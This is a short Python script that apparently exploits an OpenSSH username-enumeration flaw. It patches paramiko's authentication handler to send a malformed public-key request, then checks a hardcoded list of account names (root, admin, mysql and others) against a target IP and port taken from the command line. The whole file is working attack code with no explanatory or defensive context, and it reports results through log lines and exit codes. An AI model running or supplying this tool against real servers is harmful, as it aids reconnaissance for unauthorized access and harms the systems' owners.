#encoding:utf-8
try:
    import os
    import logging
    import paramiko                 # pip install cryptography == 2.4.2
    import socket
    import sys
except:
    os._exit(6)
 

logging.basicConfig(level=logging.INFO,format='%(message)s')
class InvalidUsername(Exception):
    pass
 
 
def add_boolean(*args, **kwargs):
    pass
 
old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]
 
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)
 
 
def userauth_failure(*args, **kwargs):
    raise InvalidUsername()
 
def check (ip,port,username):
    
    paramiko.auth_handler.AuthHandler._handler_table.update({
        paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
        paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
    })
    sock = socket.socket()
    sock.settimeout(1)
    try:
        sock.connect((ip, port))
    except socket.error:
        logging.info("[-] {} time out".format(ip))
        return 4 
 
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        logging.info("[-] {} time out".format(ip))
        return 4
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        logging.info("[-] {} do not found openssh".format(ip))
        return 2
    except paramiko.ssh_exception.AuthenticationException:
        logging.info("[+] {} find openssh default group name. username:".format(ip)+username)
        return 1
def main(ip,port):
    usernames = ["root","admin","mysql","deamon","news"]
    try:
        for username in usernames:
            get = check(ip,port,username)
            if get == 1:        
                os._exit(get)
        os._exit(2)
    except Exception as e:
        os._exit(3)
if __name__ == "__main__":
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,int(port))